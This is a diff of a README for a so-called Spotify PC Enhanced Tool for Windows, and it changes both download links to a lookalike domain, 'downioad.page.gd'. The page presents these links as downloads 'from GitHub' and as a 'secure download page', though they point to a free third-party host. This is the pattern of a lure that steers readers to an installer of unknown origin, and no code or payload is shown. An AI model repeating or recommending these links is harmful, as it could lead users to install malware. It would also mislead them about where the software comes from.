@@ -2,7 +2,7 @@
 
 Welcome to the Spotify PC Enhanced Tool, your go-to solution for personalizing and upgrading your desktop music experience. This tool is designed for Windows users who want to customize Spotify with advanced features, making every listening session more engaging and tailored to individual preferences.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,6 +72,6 @@ A: Yes, the tool provides an uninstall option through Windows Settings or its ow
 
 To experience the enhanced features, download the latest version of the Spotify PC Enhanced Tool from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link leads to a secure download page with the most recent 2026 release. Ensure you follow the installation instructions for a smooth setup.
